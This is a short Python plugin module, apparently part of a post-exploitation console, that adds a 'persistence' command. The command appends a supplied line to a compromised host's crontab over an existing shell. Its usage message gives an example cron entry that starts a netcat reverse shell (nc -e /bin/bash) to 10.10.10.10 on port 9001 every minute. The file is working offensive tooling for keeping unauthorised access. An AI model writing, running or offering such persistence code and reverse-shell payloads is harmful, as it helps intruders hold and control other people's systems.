from .base_module import BaseModule

class Module(BaseModule):
    @property
    def commands(self) -> list[str]:
        return ["persistence"]

    def get_help(self) -> dict:
        return {
            "persistence": ("cron <payload>", "Add a cron job for persistence. Payload should be a full cron line.")
        }

    def execute(self, args: list[str]):
        if not args or args[0] != "cron" or len(args) < 2:
            return self.console.print("[red]Usage: persistence cron \"<cron_line>\"[/red]\nExample: persistence cron \"* * * * * /usr/bin/nc -e /bin/bash 10.10.10.10 9001\"")

        cron_line = " ".join(args[1:])
        cmd = f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -'

        res = self.shell.execute_command(cmd)
        if res.get('status') == 'success' and not res.get('output'):
            self.console.print("[green]Cron job added successfully.[/green]")
        else:
            self.console.print(f"[red]Failed to add cron job: {res.get('output') or res.get('message')}[/red]")